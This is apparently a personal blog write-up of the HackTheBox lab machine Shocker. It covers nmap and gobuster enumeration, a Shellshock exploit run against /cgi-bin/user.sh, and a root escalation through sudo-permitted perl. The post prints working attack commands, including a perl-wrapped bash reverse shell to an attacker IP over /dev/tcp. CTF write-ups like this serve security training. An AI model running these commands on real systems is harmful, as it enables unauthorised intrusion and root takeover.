---
layout: single
title: "HTB - Shocker Writeup - 10.10.10.56"
date: 2020-07-04 08:49:23 +0100
categories: hackthebox
excerpt: My walkthrough / writeup of the HTB linux machine Shocker.
---

![shocker](/images/hackthebox-writeups/shocker/htb.png)

# HackTheBox - Shocker - 10.10.10.56

Shocker is a 20 point easy linux machine on [hackthebox.eu](https://hackthebox.eu) that requires you to exploit an http shellshock vulnerability and then use a sudo NOPASSWD perl command to gain a reverse shell as the root user.

## 1. Recon

To start this box off we will do an nmap scan of the target machine, 10.10.10.56 `nmap -sC -sV -oA nmap/shocker-init 10.10.10.56`

{% highlight bash linenos %}
Nmap scan report for 10.10.10.56
Host is up (0.033s latency).
Not shown: 998 closed ports
PORT STATE SERVICE VERSION
80/tcp open http Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|\_http-title: Site doesn't have a title (text/html).
2222/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
| 2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
| 256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_ 256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
{% endhighlight %}

Seeing as though there is nothing of intrest here, let's run a `gobuster` scan on the webpage
{% highlight bash %}
┌─[root@kali]─[10.10.14.11]─[~/htb/boxes/Shocker]  
└──╼ $gobuster dir -u http://10.10.10.56 -w /usr/share/wordlists/dirb/small.txt -s 307,200,204,301,302,403 -t 50
===============================================================  
Gobuster v3.0.1  
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)  
===============================================================
[+] Url: http://10.10.10.56
[+] Threads: 50
[+] Wordlist: /usr/share/wordlists/dirb/small.txt
[+] Status codes: 200,204,301,302,307,403
[+] User Agent: gobuster/3.0.1
[+] Extensions:  
[+] Timeout: 10s
===============================================================
2020/07/05 18:52:05 Starting gobuster
===============================================================
/cgi-bin/ (Status: 403)
===============================================================
2020/07/05 18:52:08 Finished
===============================================================
{% endhighlight %}

### The /cgi-bin/ Directory

Bingo, we got a hit for the cgi-bin directory, this directory usually contains script files, and any files you place in it will be treated as programs, and will be executed by the server instead of displayed. So let's fuzz for scripts with `.pl` and `.sh` extensions.

{% highlight bash %}
┌─[root@kali]─[10.10.14.11]─[~/htb/boxes/Shocker]
└──╼ $gobuster dir -u http://10.10.10.56/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -s 307,200,204,301,302,403 -x txt,sh,cgi,pl -t 50  
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url: http://10.10.10.56/cgi-bin/
[+] Threads: 50
[+] Wordlist: /usr/share/wordlists/dirb/small.txt
[+] Status codes: 200,204,301,302,307,403
[+] User Agent: gobuster/3.0.1
[+] Extensions: pl,txt,sh,cgi
[+] Timeout: 10s
===============================================================
2020/07/05 18:58:32 Starting gobuster
===============================================================
/user.sh (Status: 200)
===============================================================
2020/07/05 18:58:35 Finished
===============================================================
{% endhighlight %}

## 2. Exploitation

Nice, we got a script, `user.sh`, after some reaserch and manual enum, the box's apache webserver seems like it would be vulnerable to [this exploit](https://www.exploit-db.com/exploits/34900), let's download it from exploitdb.

This is the script's usage:
{% highlight python %}
Usage:
./exploit.py var=<value>

Vars:
rhost: victim host
rport: victim port for TCP shell binding
lhost: attacker host for TCP shell reversing
lport: attacker port for TCP shell reversing
pages: specific cgi vulnerable pages (separated by comma)
proxy: host:port proxy

Payloads:
"reverse" (unix unversal) TCP reverse shell (Requires: rhost, lhost, lport)
"bind" (uses non-bsd netcat) TCP bind shell (Requires: rhost, rport)

Example:

./exploit.py payload=reverse rhost=1.2.3.4 lhost=5.6.7.8 lport=1234
./exploit.py payload=bind rhost=1.2.3.4 rport=1234
{% endhighlight %}

So our command will be:
{% highlight bash linenos %}
python exploit.py payload=reverse rhost=10.10.10.56 lhost=10.10.14.11 lport=9004 pages=/cgi-bin/user.sh
{% endhighlight %}

### User Flag

![userflag](/images/hackthebox-writeups/shocker/user.gif)

## Privilege Escalation to Root

The root priv esc is very easy as we can run /usr/bin/perl using sudo with no password, so we can use the following command from this [gtfobins page](https://gtfobins.github.io/gtfobins/perl/) to excute bash commands using perl as root and ultimately get us a reverse shell as root.

{% highlight bash %}
10.10.10.56> sudo -l
Matching Defaults entries for shelly on Shocker:
env_reset, mail_badpass,
secure_path=/usr/local/sbin\:/usr/local/bin\

User shelly may run the following commands on Shocker:
(root) NOPASSWD: /usr/bin/perl

10.10.10.56>
{% endhighlight %}

Now for the reverse shell we will use the bash one listed here on my [Notes page](https://71xn.github.io/notes/#reverse-shells) combined with the perl command from gtfobins.

Our command should look something like this, you should also have a netcat listner setup on the port you use in your reverse shell command.
{% highlight bash %}
/usr/bin/perl -e 'exec "/bin/bash -i >& /dev/tcp/10.10.14.11/4455 0>&1";'
{% endhighlight %}

### Root Flag

![root](/images/hackthebox-writeups/shocker/root.gif)

Pwned!

If you enjoyed my write up or found it useful consider +repping my htb profile linked below:

[![HTB](http://www.hackthebox.eu/badge/image/210952.png)](https://www.hackthebox.eu/home/users/profile/210952)
